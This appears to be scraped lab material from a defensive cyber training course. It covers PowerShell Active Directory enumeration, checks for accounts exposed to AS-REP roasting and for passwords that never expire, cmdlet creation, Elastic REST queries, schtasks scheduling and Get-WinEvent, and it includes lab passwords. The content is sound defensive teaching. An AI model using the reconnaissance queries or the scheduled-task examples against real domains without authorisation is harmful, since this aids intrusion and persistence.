Get-GPOReport only runs locally on a domain machine since the permissions remote sessions require do not allow data to be sent across the connection. However, when provided access to a physical mission partner system, it is helpful to run this query to obtain a status of the current group policy posture. This query should be run in concert with a script that parses for vulnerable configurations or Security Technical Implementation Guide (STIG) findings.


The report may be printed directly to the console or exported to a HyperText Markup Language (HTML) or Extensible Markup Language (XML) document. It is inadvisable to print directly to the console because the very long format of the output is not easily read by human eyes. The output makes previous commands and output inaccessible in the terminal.


The report may also receive a Group Policy Object (GPO) from the pipeline or specify a policy by name, rather than create a report for all policies in a domain. 


Export an XML Report of AD Group Policies


The previous section explained how analysts can use a report of the Group Policies in a Domain to understand how devices across an environment are configured. Subsequently, analysts should peruse this type of report to find systemic vulnerabilities in the domain. 


The general syntax for this activity is as follows:
Get-GPOReport [ -Name <GPO Name> | -All ] [ -Domain <AD Domain> -Server <Domain Controller> ] -ReportType <XML | HTML> -Path <output file path>



An analyst may export an XML report of AD Group Policies with the following command:
Get-GPOReport -All -Domain "vcfed-int.lan" -Server "BK-DC01" -ReportType XML -Path "C:\GPOReports\GPOReportsAll.xml"

![image](https://github.com/user-attachments/assets/eab6f7bb-fa25-4180-a083-35c66e3994b3)

Run Common AD Queries on Low-Level Objects


Continue using the VM win-hunt to work in the interactive session from the last lab. Test out the low-level AD cmdlets introduced in the previous task.


Workflow


1. In the PowerShell interactive session, output a list of all users in a domain by entering the following query:
Get-ADUser -Filter *



2. Print all properties of an AD user object, the logged in user, by entering the following command:
Get-ADUser -Identity trainee -Properties *



3. List all domain-joined computers with the following query:
Get-ADComputer -Filter *



4. Display all properties of an AD computer object, the device on which the PowerShell session is established, by entering the following command:
Get-ADComputer -Identity "bk-dc02" -Properties *



5. List all computers in the workstation’s organizational unit by entering the following command:
Get-ADComputer -Filter * -SearchBase $(Get-ADOrganizationalUnit -LDAPFilter '(name=Workstations)') | FT Name



6. List all domain-joined computers by entering the following command:
Get-ADComputer -filter 'name -like "*"' -Properties * | select name,OperatingSystem,IPv4Address



7. Use the wildcard filter (*) to retrieve all DCs for a domain by entering the following command:
Get-ADDomainController -Filter *



Below, Figure 11.2-2 displays the hostnames of the two DCs. In this network, as in many AD environments, the DCs are indicated in the machine naming convention.

![image](https://github.com/user-attachments/assets/6f3b4316-844b-40da-bc65-36b49ca8557d)



8. Alternatively, list all domain controllers in a forest by entering the following command:
(Get-ADForest).Domains | foreach { Get-ADDomainController -Filter * -Server $_ | FT Name, OperatingSystem, Domain }



9. Find locked out accounts by entering the following query:
Search-ADAccount -LockedOut -UsersOnly | Format-Table Name, SamAccountName

![image](https://github.com/user-attachments/assets/67836439-4251-4633-9225-536ebeee6e35)


![image](https://github.com/user-attachments/assets/452d9033-4735-4f80-8d82-bc969922fda2)

AD Environment Discovery Script
When analysts audit the AD domain with tools such as Bloodhound, they must determine which AD objects exist in the current environment and which configurations lead to exploitable vulnerabilities. 

﻿

Create an AD Environment Discovery Script
﻿

Use the PowerShell ISE and the cmdlets introduced in this lesson to create a script that performs queries to discover the objects in the domain with the CPT toolkit. Determine which queries are appropriate for the script based on the questions asked on the next set of task cards.

﻿

Workflow
﻿

1. Log in to the VM win-hunt with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open the PowerShell ISE.

﻿

3. Enter the following three lines to create a connection between the analyst machine and the mission partner domain controller on which the upcoming queries will be performed:

$dc = "172.25.20.3"

$credentials = Get-Credential

$session = New-PSSession -ComputerName $dc -Credential $credentials
When prompted for credentials for the PowerShell session, enter the following:

Username: vcfed-int\trainee
Password: CyberTraining1!
﻿

4. ﻿Answer the next set of questions by entering the appropriate queries using the following syntax and running the appropriate script:

   

############Invoke-Command -Session $session -ScriptBlock {Cmdlet}#################


![image](https://github.com/user-attachments/assets/f81e3187-9cc1-499b-a7c9-0ad6d65cf666)

![image](https://github.com/user-attachments/assets/3ee2f314-b093-48ed-ac86-badd0b9a5244)



![image](https://github.com/user-attachments/assets/39647def-1c5e-42ff-a8ba-20c19c4453df)


![image](https://github.com/user-attachments/assets/96fb7eea-082d-4d3c-a02b-48d8e32fa293)


Identifying AD Vulnerabilities with PowerShell
In an AD environment, a number of potential vulnerabilities can lead to the compromise of a user, a system, or even an entire domain. The section addresses two possible concerns: 

Accounts with passwords that never expire

Accounts "roastable" by Kerberos Authentication Service Response (AS-REP)

Accounts with Passwords That Never Expire
﻿

Accounts that do not require regular rotation of passwords are vulnerable to password spray attacks, especially when password reuse is involved. A user’s password on an insecure service may be compromised and then used in the mission partner environment. This allows the compromised account that retains the password indefinitely to extend the vulnerable window for the domain.

﻿

To effectively prevent this vulnerability, analysts may write a query that filters for accounts configured with the flag DONT_EXPIRE_PASSWORD set. In the AD user object, this flag is designated by the field passwordNeverExpires. The following query fulfills these requirements:



############Get-ADUser -filter { passwordNeverExpires -eq $true -and enabled -eq $true } | Select Name, DistinguishedName##############
﻿

NOTE: The query in above is valuable in real situations, but not applicable in this lesson's controlled lab environment. The passwords for all accounts in this lesson never expire so that the lab environment is stable for lesson activities. 


 Accounts Roastable by Kerberos AS-REP


System environments may allow some user accounts to access domain resources using the Kerberos protocol without requiring Kerberos pre-authentication or correct credentials beforehand. These users expose the environment to a powerful attack by adversaries with "crackable" hashes that extract passwords. This attack is known as an AS-REP roast, which is named after the Kerberos message that is encrypted with the user’s NT hash. The Kerberos message is the target of the attack. Users vulnerable to this attack are configured with the flag DONT_REQ_PREAUTH set in the account. 


Identify Kerberos Pre-Authentication Misconfigurations


Query the flag DONT_REQ_PREAUTH in PowerShell using the cmdlet Get-ADUser and the property DoesNotRequirePreauth. 


Workflow


1. In the VM win-hunt, establish a remote connection to the domain controller and use PowerShell to determine which user is vulnerable to the AS-REP roast attack by executing the following query:

   
##############Get-ADUser -filter * -properties DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq "TRUE"} | select samaccountname#####################



3. Use the output from this query to answer the following question.


![image](https://github.com/user-attachments/assets/311e08b1-171a-4f56-91c7-f76bcacb0c29)


![image](https://github.com/user-attachments/assets/665ac202-2423-4162-b1b8-9525f0517b82)


![image](https://github.com/user-attachments/assets/1ab366a8-2e50-4528-b137-d7026f09683d)

What Is a PowerShell Cmdlet?
A PowerShell cmdlet (pronounced “command-let”) is a lightweight command that manipulates objects within the PowerShell environment. Cmdlets can be recognized by their naming convention, which employs a verb-noun pattern. This pattern is apparent in the following examples of popular cmdlets:

Get-Help
Get-Process
Start-Service
A cmdlet comprises a single command that performs an action and returns a Microsoft .NET object to the next command within the pipeline. Cmdlets are simple and designed to be combined with other cmdlets within the pipeline chain. The following are examples of common cmdlet verbs and what they indicate:

GET - retrieve data
SET - establish or change data
OUT - direct the command output to a specified destination
PowerShell cmdlets have many different traits that differentiate them from commands in other command-shell environments. Cmdlets are instances of Microsoft .NET classes and can be created from a few lines of code. Cmdlets are not stand-alone executables, nor do they handle the same tasks as the PowerShell runtime. The runtime handles parsing, error presentation, and output formatting are handled, whereas cmdlets do not. Cmdlets process input from the pipeline, rather than from streams of text, and they deliver objects as output to the pipeline. 

﻿

Cmdlets are also available in different forms. This includes binary (C#) cmdlets, advanced script functions, and workflows. To create a binary cmdlet, a class must be implemented that derives from one of two special cmdlet base classes. The derived class must conduct the following tasks:

Declare an attribute that identifies the derived class as a cmdlet.
Define public properties that contain attributes that identify the public properties as cmdlet parameters.
Override one or more of the input processing methods to process records. 
﻿

Table 11.3-1, below, lists common terms for creating or interacting with PowerShell cmdlets:

![image](https://github.com/user-attachments/assets/6e0cb406-2452-4bf0-abc7-f68e79db57e5)

Creating a PowerShell Cmdlet from Scratch
Declaring Functions for Cmdlets
﻿

Creating custom PowerShell cmdlets starts with creating a PowerShell function. A simple function does not have complex parameter support, whereas an advanced function supports multiple arrangements of different parameter values.

﻿

A PowerShell class is used to create multiple instances of objects at run time. When defining a class, its name is also its type. For example, if a class named Device is declared and a variable named $dev is initialized to a new instance of Device, $dev is an object or instance of type Device. Each instance of Device can then have different values in its properties. 

﻿

A simple function in PowerShell is declared with a function keyword, a function name, and a set of curly brackets {}. Within the curly brackets is the code the function executes. The following is an example of a function named Get-Version that returns the current version of PowerShell:

function Get-Version {
    $PSVersionTable.PSVersion
}
﻿

While the Get-Version example above executes code, many other functions execute other cmdlets or commands. For example, a function may include the cmdlet Get-Process to get a list of processes. The function may also combine Get-Process with other cmdlets in a pipeline and designate the output to store all of collected objects in a single object. The single object may then be directed to output all its collected data and return it to the user that executed the function. 

﻿

Converting Functions into Cmdlets
﻿

Converting a function into a cmdlet is a matter of updating the script’s syntax. The minimum required changes are to add the attribute CmdletBinding as the first line in the body of the function, followed by a param block, as follows:

[CmdletBinding()]
param(
) 
﻿

Any other changes are optional. For example, other attributes can be specified within the syntax [CmdletBinding()]. Adding additional attributes in this syntax allows functions to access several methods and properties through the variable $PsCmdlet by using the blocks begin, process, and end. 

﻿

Although the param block is also required, it does not need to have any parameters defined in the function. Parameter definitions can be added using advanced functions that provide instructions to the cmdlet. 

         

After a cmdlet is created, it can be saved as a script module with the extension .psm1. This extension allows PowerShell to use rules and module cmdlets in the file. Having a PowerShell file saved as a script module makes it easy to use the built-in cmdlet Import-Module to run the custom cmdlets on other systems. The  cmdlet Import-Module adds one or more modules to the current session. By default, Import-Module only imports a module into the current session. To use this cmdlet for something else, it would need to be specified in the PowerShell profile.

﻿

Create a Basic Cmdlet
﻿

Use PowerShell ISE to create a basic PowerShell cmdlet from scratch. First, create a PowerShell function that displays the name of each running process, its Process Identifier (PID) number, and its Parent Process Identifier Number (PPID). Then, add the necessary code to convert the function into a cmdlet. 

![image](https://github.com/user-attachments/assets/fee56ad1-ac2e-4a27-87c8-4a7c30a89726)


efine the class ProcInfo by adding the following text on lines 1 through 5 of the new script:
class ProcInfo {
[int] $PID
[int] $PPID
[string] $PName
}



5. Create the function Get-ProcessesPids by inputting the following text on lines 7 through 19:
Function Get-ProcessesPids {
	$processes = Get-Process
	$output = New-Object -TypeName "System.Collections.ArrayList"
	foreach($proc in $processes) {
		$tempProc = New-Object ProcInfo
$tempProc.PName = $proc.ProcessName
$tempProc.PID = $proc.Id
$tempProc.PPID = (Get-CimInstance Win32_Process | 
Where ProcessID -eq $proc.Id).ParentProcessId
$output.Add($tempProc) | Out-Null
}
return $output
}



6. Execute the script by entering the following function call at the beginning of line 21:
Get-ProcessesPids



This basic script has a PowerShell class, a function, and a line to call the function so the script can be executed. However, the script is not yet a cmdlet because it is missing both the attribute CmdletBinding and the Param block. 


7. Save the PowerShell script as ProcPids.ps1, and run the script.


8. Remove the function call Get-ProcessesPids on line 21.


This line is not required in the script after the script is converted into a cmdlet. 
 
9. Convert the script into a cmdlet by adding the following text on lines 8 through 10:

    
[CmdletBinding()]
param(
)

![image](https://github.com/user-attachments/assets/f0f7b70c-5d9b-467d-aa7c-6a2ded8c7363)

Save the new cmdlet as ProcPids-Cmdlet.psm1


11. Within the PowerShell session, change to the directory where the files are saved by entering the following command:
cd .\Documents



12. View the PowerShell files by entering the following command:
ls



13. Import the module with the following command:
Import-Module .\ProcPids-Cmdlet.psm1 -Force



The option -Force ensures that the new cmdlet definition from the file overwrites any previous definition loaded into memory as a module. This is important when making changes and adjustments to the cmdlet code.


14. Execute the newly created cmdlet by entering the following command:
Get-ProcessesPids 



The name of the cmdlet is the same as the function name that was defined in the code.


15. View the cmdlet’s auto-generated Get-Help file with the following command:
Get-Help Get-ProcessesPids



The cmdlet Get-Help displays information about PowerShell commands and cmdlets. When a cmdlet is created, it automatically generates a help file for that cmdlet. The cmdlet Get-Help automatically generates the following items for the cmdlet:
Name
Syntax of the cmdlet
Parameter list
Common parameters
Parameter attribute table
Rema rks 
 
Advanced Cmdlet Parameters
Additional parameter attributes and arguments are available for creating advanced functions. These additional features can be used to limit the parameter values that are submitted with the parameter. Both types of parameters are available to users: the parameters added to the function as well as the common parameters that PowerShell adds automatically to all cmdlets and advanced functions. This section introduces the following advanced parameters and attributes that are available for PowerShell cmdlets: 

Switch parameters

Parameter sets

Parameter attributes

Alias attributes

﻿

Switch Parameters
﻿

Switch parameters do not take any parameter value. Instead, their presence or absence conveys a Boolean true-or-false value. When a switch parameter is present, it has a true value. When this parameter is absent, it has a false value.

﻿

To create a switch parameter in a function, specify the switch type in the parameter definition. Switch parameters are easy to use and are preferred over Boolean parameters, which have a less natural syntax in PowerShell. For example, to use a switch parameter, the user enters the following parameter in the command:

-IncludeAll
﻿

Whereas a Boolean parameter requires entering the parameter as well as the Boolean value, as such:

-IncludeAll $true 
﻿

When creating switch parameters, the parameter name must be carefully chosen. Avoid ambiguous terms that imply a value is required. Instead, ensure the parameter name communicates the effect of the parameter to the user.

﻿

Parameter Sets
﻿

PowerShell uses parameter sets to enable single cmdlets to perform different actions for different scenarios. Parameter sets allow for exposure to different PowerShell parameters for the users. Parameter sets also allow users to specify parameters to return different information. 

﻿

Each parameter set must have a unique parameter that the PowerShell runtime uses to expose the appropriate parameter set. The unique parameter should be a mandatory parameter. A mandatory parameter means that the user must specify the parameter and the PowerShell runtime uses that parameter to identify the Parameter set.

﻿

When multiple parameter sets are defined, the keyword DefaultParameterSetName of the attribute CmdletBinding can be used to specify the default parameter set. PowerShell uses the default parameter set if the information provided by the command does not indicate the parameter set to use. 

﻿

The syntax for defining multiple parameter sets is as follows:

"DefaultParameterSetName=" attribute (CmdletBinding)
﻿

The attribute ParameterSetName specifies the parameter set to which the parameter belongs. If a parameter set is not specified, the parameter belongs to all the parameter sets defined by the function. Therefore, to create unique parameter sets, each set must have at least one parameter that is not a member of any other parameter set. 

﻿

Only one value for ParameterSetName can be specified in each argument. Only one argument for ParameterSetName in each parameter attribute is allowed. Adding more parameter attributes indicates that a parameter appears in more than one parameter set. Below is the syntax for this argument:

"ParameterSetName=" attribute (param block)
﻿

Parameter Attribute
﻿

The attribute Parameter declares the attributes of function parameters. This attribute is optional and can be omitted if none of the parameters of the function need attributes. However, for a function to be recognized as an advanced function, it must have either the CmdletBinding or Parameter attributes, or both. The attribute Parameter provides arguments that define the characteristics of the parameter, such as whether it is mandatory or optional. 

﻿

The following syntax is used to declare the attribute Parameter, an argument, and an argument value. The parentheses that enclose the argument and its value must follow Parameter with no intervening space. Commas can be used to separate arguments within the parentheses. 

param(
    [Parameter(Argument=value)]
    $ParameterName
)
﻿

The attribute Mandatory indicates that the parameter is required. The parameter is optional if this argument is not specified. This attribute can be set to =$false or $true. Making the parameter optional lets the user run the cmdlet with or without the parameter. If the attribute is set to $true, the parameter must be provided otherwise the cmdlet displays an error message. The expected argument for the parameter is a string, indicated by adding the identifier [String] before the parameter name. The following is an example of using the argument Mandatory to make the parameter mandatory:

param(
    [Parameter(Mandatory=$true)]
    [string[]]
    $ParameterName
)    
﻿

When the cmdlet executes with a parameter, the value provided on the command line is stored in the variable $ParameterName, as indicated in the above example. An if statement within the cmdlet can determine if the parameter $ParameterName was used on the command line. This is known as a check, which is used to determine if a parameter was provided at all. Checks tell the cmdlet how to proceed with the output.

﻿

The argument Position determines whether the parameter name is required when the parameter is used in a command. When a parameter declaration includes the argument Position, the parameter name can be omitted. PowerShell then identifies the unnamed parameter value by its position or order in the list of unnamed parameter values within the command. 

﻿

The value of the argument Position is specified as a number. A value of 0 represents the first position in the command, a value of 1 represents the second position, and so on. If a function has no positional parameters, PowerShell then assigns positions to each parameter based on the order in which the parameters are declared. However, the best practice for using positional parameters is to use the argument Position. 

﻿

The following example uses the argument Position with a value of 0. It uses the parameter ComputerName. When -ComputerName is omitted, its value must be the first or only unnamed parameter value in the command.  

param(
    [Parameter(Position=0)]
    [string[]]
    $ComputerName
)
﻿

Alias Attribute
﻿

The Alias attribute establishes an alternate name or nickname for a cmdlet or cmdlet parameter. The parameter aliasnames specifies a set of comma-separated aliases for the cmdlet parameter. The following is the syntax for an alias:

[Alias(aliasnames)]
﻿

There are two types of aliases, each with its own specific use case and meaning:

﻿

Cmdlet Aliases﻿

The alias attribute is used with the cmdlet declaration. This is shorthand of a full cmdlet to make it easier to specify a cmdlet and not type out the full name. For example, the Get-Command cmdlet has a built-in alias of gcm.

Each cmdlet alias name must be unique.

This must be placed outside of the param block within a cmdlet.

Parameter Aliases﻿

The alias attribute is used with the Parameter attribute when a cmdlet parameter is specified. 

Each parameter alias name must be unique within a cmdlet. 

The alias attribute is used once for each parameter in a cmdlet.

This must be placed within the param block in a cmdlet.

﻿

Complex Cmdlet Parameters
﻿

Modify the existing PowerShell cmdlet and add complex parameters to the cmdlet. 


Integrating with RESTful APIs in PowerShell
A critical skill for Host Analysts is to develop custom tools and scripts that perform automated tasks for network communication between systems. Implementing network support in programming languages is typically complicated and time-consuming. However, PowerShell resolves these issues with cmdlets that support REST. REST defines a set of recommendations and constraints for network communication between web-based systems using Hypertext Transfer Protocol (HTTP).

﻿

Networked systems that adhere to the REST conventions are referred to as “RESTful”. PowerShell provides a RESTful API that facilitates client-server HTTP communications using the cmdlet invoke-restmethod. PowerShell connects to RESTful web services to easily integrate between custom scripts and existing systems on the network.

﻿

The next section explains how PowerShell supports the following:

Sending data to an HTTP server
Receiving data from an HTTP server
Using invoke-restmethod
Sending Data to an HTTP Server
﻿

PowerShell provides different methods to send a request to an HTTP server. Four methods are listed in Table 11.4-1, below. Individual web servers determine how to respond to these methods.

![image](https://github.com/user-attachments/assets/f4d4a204-2b30-4037-a20c-f7b5a95dc1fb)

HTTP Request Data Options


An HTTP request includes the method, header, resource path, and body. The following table provides additional information about these components:

![image](https://github.com/user-attachments/assets/9054ab5c-3811-48d0-a27b-828e18176438)

Another way to send data is with Uniform Resource Locator (URL) parameters or query strings. In these cases, additional key-value pairs are encoded in the resource path. This type of data passing allows a website to remember data between sessions. The following example URL includes two key-value pairs. The key query has a value of test and the key page has a value of 2:
http://domain.com/search?query=test&page=2

Receiving Data from an HTTP Server


Table 11.4-3, below, groups the different HTTP response codes into broad categories. The most well-known response code, 404 Not Found, is commonly displayed when URLs have a typo.


![image](https://github.com/user-attachments/assets/55c4d7ff-458c-4881-94a7-d0afbf4ef38f)

Using Invoke-RestMethod


Invoke-RestMethod is a robust cmdlet with many options including proxy, encryption, and compression support. Table 11.4-4, below, provides the basic options relevant to the labs in this lesson. One potential stumbling block is that PowerShell does not allow a user to send a GET request with a message body. Elastic allows the POST and GET requests to be used interchangeably, so any GET request that Elastic suggests can also be completed with a POST request.


![image](https://github.com/user-attachments/assets/40734809-ce8c-48aa-b654-f981646b2793)





Basic GET Request Example


The following command does not specify the options URI and Method:
$response = Invoke-RestMethod  http://site.com/people/1



The URI is assumed to be the first parameter provided and the default Method is Get. Omitting the parameter informs the cmdlet to do a Get request.


Headers Example


The following example creates a new dictionary object called $headers. This object uses the type String for both the key and value pairs:
$headers = New-Object "System.Collections.Generic.Dictionary[String,String]"
$headers.Add("X-DATE", '9/29/2014')
$headers.Add("X-SIGNATURE", '234j123l4kl23j41l23k4j')
$headers.Add("X-API-KEY", 'testuser')
$response = Invoke-RestMethod 'http://site.com/people/1' -Headers $headers



Post Example


JavaScript Object Notation (JSON) is an open standard that was originally intended for JavaScript, but has gained popularity in many other types of software. It is an alternative to various markup languages such as Extensible Markup Language (XML) and Yet Another Markup Language (YAML). JSON is commonly pronounced “Jay-sawn,” although “Jason” is also acceptable.


The body of the following request uses JSON format to define a single key-value pair of name-steve in the form of a hashtable. The hashtable is converted to a JSON and passed into the body of the RESTful method.
$person = @{
   name='steve'
}
$json = $person | ConvertTo-Json
$response = Invoke-RestMethod 'http://site.com/people/1' -Method Post -Body $json -ContentType 'application/json'

3. Select the bookmark Sysmon_8_Query from the bookmarks bar. 


NOTE: If the message "Your connection is not private" is displayed, select Advanced and select the link Proceed to 199.63.64.92 (unsafe). Log in using the following credentials, then reselect the bookmark Sysmon_8_Query from the bookmarks bar:
Username: trainee@jdmss.lan
Password: CyberTraining1!



The following is the query from the bookmark. It searches for records based on event_id, agent.name and a time range. This query returns 6 results.
winlog.event_id.keyword:8 AND agent.name: eng-wkstn-3

Start: April 19th 2022 @ 00:30:00
Stop: April 19th 2022 @ 23:30:00 



4. Select the bookmark labeled Dev Tools - Elastic from the bookmarks bar. 
If the "Welcome to Console" message appears, select Dismiss.

The Dev Tools interface allows users to prototype RESTful commands. The interface accepts queries in the left pane and displays the results in the right pane. One critical difference between the RESTful interface and the previous search interface is that the RESTful interface uses a different set of logical operators, as listed below in Table 11.4-5:


![image](https://github.com/user-attachments/assets/be43cf1e-1fb6-4e32-a702-4de13f108dd6)

5. Conduct a query for winlog.event_id.keyword: 8 in the dev API by entering the following input:
GET _search
{
  "query": {
    "bool": {
      "must": {
        "match":{"winlog.event_id.keyword":"8"}
      }
    }
  }
}



NOTE: The Elastic Dev Tools console attempts to predictively add brackets for interactive typing. When copying and pasting queries, ensure the pasted text matches the original and that additional brackets have not been added.


6. Run the query by selecting the green play icon in the upper right corner of the left pane.


The query results include all entries where winlog.event_id.keyword is equal to 8. Eighty records are returned, indicating 80 occurrences of event ID 8.




7. Refine the query in the dev API to only those entries that also have eng-wkstn-3 as the agent.name by entering the following:
GET _search
{
  "query": {
    "bool": {
      "must": [
        {"match":{"winlog.event_id.keyword":"8"}},
        {"match":{"agent.name":"eng-wkstn-3"}}
      ]
    }
  }
}



This modified query returns six entries where winlog.event_id.keyword equals 8 and agent.name equals eng-wkstn-3. 


8. Add a time range in the query that starts on April 19, 2022 at 00:30:00 and stops on April 19, 2022 at 23:30:00 by entering the following:
GET _search
{
  "query": {
    "bool": {
      "must": [
        {"match":{"winlog.event_id.keyword":"8"}},
        {"match":{"agent.name":"eng-wkstn-3"}},
        {"range":{
          "@timestamp":{
            "gte":"2022-04-19T00:30:00.000Z",
            "lte":"2022-04-19T23:30:00.000Z"
          }
        }}
      ]
    }
  }
}



Although the results of the final query are limited to entries created within  the provid ed time range, it still returns only six hits. 


RESTful ElasticSearches with PowerShell
The previous lab demonstrated how to conduct manual RESTful queries using the Dev Tools interface. This knowledge helps construct PowerShell commands for the same queries. 

﻿

Conduct RESTful ElasticSearches with PowerShell
﻿

Convert the RESTful queries from the previous lab into a format for PowerShell to execute. Continue working in the VM win-hunt. 

﻿

Workflow
﻿

1. On the Elastic Dev Tools page, copy the query from the previous lab as a Client Uniform Resource Locator (cURL) command by selecting the wrench icon in the query input box and selecting Copy-as-cURL.

﻿

2. Use PowerShell ISE to open the file Elastic_PowerShell.ps1 from the desktop.

﻿

3. Paste in the cURL command at the end of the file.

﻿

NOTE: In this lab environment, the Secure Sockets Layer (SSL) certificates are not valid and require an additional step for PowerShell to make the connection. The script Elastic_PowerShell.ps1 provides code to account for certificates on the Elastic server.

﻿

4. Comment out the first line from the pasted cURL example in the script by adding # before curl, at the beginning of the line, and removing the single quote character from the very end of the pasted example. 

﻿

Only the query portion of the cURL command is necessary. The rest of the cURL command is useful to reference, but it is not executed.

﻿

5. Define the body content as a hash table and name the variable elastic_query by entering $elastic_query = @" at the beginning of the code block and "@ at the end, so that the entire block is displayed as follows:

$elastic_query = @"
{
  "query": {
    "bool": {
      "must": [
        {"match":{"winlog.event_id.keyword":"8"}},
        {"match":{"agent.name":"eng-wkstn-3"}},
        {"range":{
          "@timestamp":{
            "gte":"2022-04-19T00:30:00.000Z",
            "lte":"2022-04-19T23:30:00.000Z"
          }
        }}
      ]
    }
  }
}
"@
﻿

6. Define the headers as a hash table by entering the following syntax after the code block:

$headers = @{"Content-Type"="application/json"} 
﻿

7. Send a POST request to the same endpoint as the example cURL command, and store the results in a variable by adding a new line that starts with the cmdlet Invoke-RestMethod, as shown below:﻿

$results = Invoke-RestMethod "https://199.63.64.92:9200/_search" -Method POST -Headers $headers -Body $elastic_query



Unlike cURL, PowerShell does not send a GET request with a defined message body. Elastic allows for GET or POST to be used interchangeably for queries.

﻿

8. Select the Run Script icon above the editor window.

﻿

9. Confirm the number of records by running the following command on the interactive prompt:
﻿

$results.hits.total.value
﻿

The value displayed is 6.

﻿

The $results of a query can be stored in a JavaScript Object Notation (JSON) file. To store query results in a JSON file, use the following command syntax:

﻿

$results | ConvertTo-Json -Compress | Set-Content <File Path\FileName.json>  

﻿

Running queries on a regular basis and storing them may be used to build a baseline and detect future changes within the environment.

﻿
PowerShell Execution Options
For PowerShell to execute code, something needs to tell Windows to execute the code. The best way to do this is by automating the code execution. There are different ways to automate code execution and they range from simple and functional, to more creative and customized. Some automation ideas include the following:

Setting registry keys that run code after a system boot.
Setting up the code to run as a service.
Building a custom application that is always running or "listening", so that it can either execute the script on a regular interval or after accepting a message that indicates it needs to start the PowerShell script. 
Despite the different ideas available, the most common way to automate code is with the built-in Windows scheduler, which this section explores.

﻿

Using the Windows Scheduler
﻿

The Windows command schtasks, an amalgamation of schedule and tasks, is responsible for the periodic execution of programs on a Windows system. The command is powerful and the options to run the command are complicated. To make this data more digestible, the information is broken down into several categories that focus on the creation of scheduled tasks.

﻿

Table 11.4-8, below, lists optional system connection options. The scheduled task defaults to the local computer, when the options listed are not specified. 

![image](https://github.com/user-attachments/assets/91c8b708-8bde-4690-b475-d746f44d379a)

Table 11.4-9, below, lists options that are relevant for any task being created.

![image](https://github.com/user-attachments/assets/92c933fe-34f1-4737-9c1e-751e1da97bcb)

The next two tables apply based on whether a task is time-based or event-based. A time-based run option is for tasks that run on regular intervals. For example, running a task on the first Tuesday of each month, or every other week. An event-based option runs when a user logs on, when a system turns on, or based on specific event logs. 


Time-Based Options 


The syntax for time-based scheduling uses the schedule option tag followed by one of the time-based option keywords listed below:
/SC (MINUTE, HOURLY, DAILY, WEEKLY, MONTHLY)



Time based scheduled tasks execute the program specified at the desired interval. When a script does not need to be constantly executed, the script can be designed to check whether it is safe to execute before performing its task. For example, a script is created to update a zip file with local logs and send the zip file to a server. In this case, the script could save the last time it ran and compare that to the newest file in the directory. The advantage of this pattern is that the script execution can be handled by schtasks. The disadvantage is that running the script every 10 mins could cause a 10-minute delay for any new files getting shipped.


The following table provides additional information on time-based options.

![image](https://github.com/user-attachments/assets/c4d87b6a-fc57-409d-88c1-fbfab608009d)

Event-Based Options 


The syntax for event-based scheduling uses the schedule option tag followed by one of the event-based option keywords listed below:
/SC (ONCE, ONSTART, ONLOGON, ONIDLE, ONEVENT)



Event-based tasks are useful and powerful ways to launch a script. ONSTART, ONLOGON, and ONIDLE have their obvious uses. ONSTART is used when something needs to be done to the computer when it starts, regardless of the user. ONLOGON is useful for applying changes to a specific user. ONIDLE is useful when something needs to be run but interrupting the user is a concern. 


ONEVENT is a powerful tool because it allows a script to execute when a specific event log appears on the system. A use-case for this would be hunting for an adversary where forensically-relevant data is short-lived, but the initial detection of the event is known. As an example, imagine an adversary that was using tools that did not get written to disk, but it was known that the adversary would try to download a sensitive file. If object-access logging is enabled, and an XML Path Language (XPath) query string is made looking for specific access to a specific file, then that scheduled event could kick off a tool that dumps memory and ships off the threat actor's toolkit.


The following table provides additional information on event-based options.

![image](https://github.com/user-attachments/assets/c38d357f-8016-4053-a246-9501bac9253a)

![image](https://github.com/user-attachments/assets/e2734995-3d54-4b23-bcb7-f3c277d93b72)


Example schtasks commands


The following examples demonstrate different ways to create scheduled tasks with the command line tool schtasks.


Create a task that runs every time the system turns on after the 15th of March 2020:
schtasks /create /tn My App /tr c:\apps\myapp.exe /sc onstart /sd 03/15/2020



Create a task that runs with system permissions on the 15th of every month:
schtasks /create /tn My App /tr c:\apps\myapp.exe /sc monthly /d 15 /ru System



Create a remote task to run on system SRV01 every 10 days:
schtasks /create /s SRV01 /tn My App /tr c:\apps\myapp.exe /sc daily /mo 10



Create an event that runs myapp.exe whenever a user logs off (Windows Event ID 4647):
SCHTASKS /Create /TN test2 /RU system /TR c:\apps\myapp.exe /SC ONEVENT /EC Security /MO "*[System[Provider[@Name='Microsoft Windows security auditing.'] and EventID=4647]]"



NOTE: One reason this command is complicated is because the modifier option /MO is overloaded. This means that the values given to this parameter depend on the context of other parameters.


System Status Queries
PowerShell offers many cmdlets to query a wide variety of information. These cmdlets are especially useful for obtaining information about the status of a system. The following cmdlets are the most common for retrieving specific system information about local or remote computers: 

Get-WinEvent retrieves Windows event logs from local and remote computers.
Get-Process retrieves the processes running on a local computer.
Get-Service retrieves services on a local computer.
Get-HotFix retrieves the hotfixes installed on a local or remote computer.
The next set of tasks provide hands-on labs to explore each of these cmdlets and their applicable use cases.

Use Get-WinEvent
Get-WinEvent
﻿

The cmdlet Get-WinEvent queries event logs on a local or remote computer. Ideally an environment's logs are gathered and processed by a Security Information and Event Management (SIEM) system. However, analysts may eventually run into a host that is not sending logs off the system. The cmdlet Get-WinEvent provides a convenient on-system option to query system logs, especially when off-system logging is unavailable. This cmdlet also checks the logging configuration of a specified system. 

﻿

Use Get-WinEvent
﻿

Use Get-WinEvent to retrieve the status of log providers on the remote system bp-wkstn-10. Retrieve detailed information and all the available logs from a specific log provider.

﻿

Workflow
﻿

1. Log in to the Virtual Machine (VM) dc01 with the following credentials:

Username: trainee
Password: CyberTraining1!
﻿

2. Open PowerShell as an Administrator.

﻿

3. Return a list of all logging providers for bp-wkstn-10 (whether or not they are enabled) by running the following command:

Get-WinEvent -ComputerName bp-wkstn-10 -ListLog * | Format-Table LogName, IsEnabled
﻿

Adding the flag -ComputerName to this cmdlet enables remote querying.

﻿

4. List more detailed information about a specific log provider by running the following command:

Get-WinEvent -ComputerName bp-wkstn-10 -ListLog Microsoft-Windows-PowerShell/Operational | Format-List -Property *

![image](https://github.com/user-attachments/assets/708ee65b-0d02-4777-af5e-3825ebbabad9)

﻿

5. List all logs from Microsoft-Windows-PowerShell/Operational by running the following command:

Get-WinEvent -ComputerName bp-wkstn-10 -LogName Microsoft-Windows-PowerShell/Operational


![image](https://github.com/user-attachments/assets/4c63430f-8f9c-4205-b803-ecb9142a07a1)

﻿

The commands in this lab enable analysts to discover the logging configuration and list logs on a remote system.

﻿

